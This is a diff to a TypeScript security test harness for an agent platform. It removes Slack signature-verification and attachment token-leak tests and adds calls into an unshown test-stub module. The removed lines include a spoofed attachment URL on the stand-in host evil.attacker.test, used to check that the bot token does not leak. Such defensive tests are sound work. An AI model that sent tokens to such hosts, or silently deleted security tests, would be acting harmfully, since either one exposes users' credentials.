@@ -18,9 +18,13 @@ for (const k of ["OE_PLATFORM", "OE_WORKSPACE", "OE_SURFACE", "OE_CHANNEL", "OE_
   delete process.env[k];
 }
 
+const { registerSlackTestBridge, registerSlackFixtureMapper, registerSlackFixtureManifest } = await import("../packages/core/scripts/_slack-test-stubs.js");
+registerSlackTestBridge();
+registerSlackFixtureMapper();
+registerSlackFixtureManifest();
+
 const { ScenarioRunner, Timeline, checkGolden } = await import("./scenario-harness.js");
 const { default: discordGateway } = await import("@open-everywhere/provider-discord/agent/channels/discord-gateway.js");
-const { default: slackCommands } = await import("@open-everywhere/core/agent/channels/slack-commands.js");
 const { buildDiscordFrontHandler, PUBLIC_DISCORD_ROUTE } = await import("@open-everywhere/provider-discord/agent/channels/discord-front.js");
 const { registerConfig } = await import("@open-everywhere/core/agent/access/config.js");
 const { getOperationalStore } = await import("@open-everywhere/core/agent/operational/provider.js");
@@ -31,7 +35,6 @@ const { resolvePartition } = await import("@open-everywhere/core/agent/memory/pa
 const { buildDiscordAuth } = await import("@open-everywhere/provider-discord/agent/channels/discord-identity.js");
 const { NO_REPLY_SENTINEL } = await import("@open-everywhere/core/agent/channels/turn-delivery.js");
 const { oeFetch, setHostEgressLookup } = await import("@open-everywhere/core/agent/access/host-egress.js");
-const { fetchSlackAttachment } = await import("@open-everywhere/core/agent/access/slack-attachment-fetch.js");
 const { readAudit } = await import("@open-everywhere/core/agent/audit/audit.js");
 const { defineBundle, defineBinding } = await import("@open-everywhere/core/agent/access/bundle.js");
 const { ingestUntrusted } = await import("@open-everywhere/core/agent/access/untrusted.js");
@@ -96,20 +99,6 @@ async function frontPost(s: ScenarioDriver, label: string, interaction: unknown,
     }
   }
   s.timeline.addBlock(`  ⇠ ${res.status}`, rendered);
-}
-
-async function slackCommandPost(s: ScenarioDriver, label: string, formBody: string, signing: "none" | "wrong"): Promise<void> {
-  s.timeline.addBlock(`IN  slack slash-command POST · ${label}`, formBody);
-  const route = (slackCommands as unknown as { routes: { method: string; path: string; handler: unknown }[] }).routes[0];
-  const headers = new Headers({ "content-type": "application/x-www-form-urlencoded" });
-  if (signing === "wrong") {
-    const ts = String(Math.floor(Date.now() / 1000));
-    headers.set("x-slack-request-timestamp", ts);
-    headers.set("x-slack-signature", `v0=${createHmac("sha256", "not-the-signing-secret").update(`v0:${ts}:${formBody}`).digest("hex")}`);
-  }
-  const handler = route.handler as (req: Request, args: unknown) => Promise<Response>;
-  const res = await handler(new Request(`https://oe.example${route.path}`, { method: "POST", headers, body: formBody }), {});
-  s.timeline.add(`  ⇠ ${res.status} ${await res.text()}`);
 }
 
 function pendingRow(over: Partial<PendingActionRow> & { id: string; scopeKey: string; channelId: string }): PendingActionRow {
@@ -240,12 +229,6 @@ await scenario(
   },
   { guildProbeNetworkError: ["GS6E"] },
 );
-
-await scenario("sec-07-slack-command-signature-gate", async (s) => {
-  const form = "command=%2Foe&text=budget+raise+5&team_id=TSEC7&channel_id=CSEC7&user_id=U_ATK7";
-  await slackCommandPost(s, "NO Slack signature headers", form, "none");
-  await slackCommandPost(s, "fresh timestamp, WRONG signing key", form, "wrong");
-});
 
 await scenario("sec-08-oe-budget-raise-nonadmin", async (s, capture) => {
   await frontPost(s, '"/oe budget raise usd:5" by NON-admin U_PLEB8 in guild GS8', {
@@ -523,47 +506,6 @@ class FakeSession {
   });
   _resetImageDescriberForTest();
   if (!checkGolden("sec-14-image-desc-wrapped", t)) toolFailures++;
-}
-
-{
-  const t = new Timeline();
-  const BOT_TOKEN = "xoxb-sec15-never-real";
-  process.env.SLACK_BOT_TOKEN = BOT_TOKEN;
-  const realFetch = globalThis.fetch;
-  globalThis.fetch = (async (input: unknown, init?: { headers?: Record<string, string> }) => {
-    const u = typeof input === "string" ? input : input instanceof URL ? input.toString() : (input as Request).url;
-    const auth = new Headers(init?.headers ?? {}).get("authorization");
-    const tokenSent = auth ? (auth.includes(BOT_TOKEN) ? "BOT-TOKEN sent" : "other-auth") : "no auth header";
-    t.add(`  → EGRESS ${u}  [${tokenSent}]`);
-    return { ok: true, status: 200, arrayBuffer: async () => new ArrayBuffer(3) } as unknown as Response;
-  }) as typeof fetch;
-  setHostEgressLookup(async () => ["93.184.216.34"]);
-  async function attachmentAttempt(label: string, urlPrivate: string, id: string): Promise<void> {
-    t.add(`IN  fetchSlackAttachment · ${label}`);
-    t.addBlock("      url_private", urlPrivate);
-    try {
-      const res = await fetchSlackAttachment(toolCtx, { urlPrivate, id });
-      t.add(`  ⇠ ALLOW (HTTP ${res.status})`);
-    } catch (err) {
-      t.add(`  ⇠ DENY ${err instanceof Error ? err.message : String(err)}`);
-    }
-  }
-  try {
-    t.add(`SEED SLACK_BOT_TOKEN armed (${BOT_TOKEN}); both hosts resolve to a public IP`);
-    await attachmentAttempt("GENUINE files.slack.com url_private (token IS sent)", "https://files.slack.com/files-pri/T123-F1/screenshot.png", "F1");
-    await attachmentAttempt("SPOOFED url_private on a NON-Slack host (token must NOT leak)", "https://evil.attacker.test/files-pri/steal?x=1", "F2");
-    for (const action of ["slack.attachment.allow", "slack.attachment.deny"]) {
-      for (const r of (await readAudit({ org: "default", action })).filter((r) => ["files.slack.com", "evil.attacker.test"].includes(String(r.detail?.host)))) {
-        const reason = r.detail?.reason ? ` reason=${String(r.detail.reason)}` : "";
-        t.add(`AUDIT ${action} host=${String(r.detail?.host)}${reason}`);
-      }
-    }
-  } finally {
-    globalThis.fetch = realFetch;
-    setHostEgressLookup(undefined);
-    delete process.env.SLACK_BOT_TOKEN;
-  }
-  if (!checkGolden("sec-15-slack-attachment-host-pinned", t)) toolFailures++;
 }
 
 rmSync(tmp, { recursive: true, force: true });
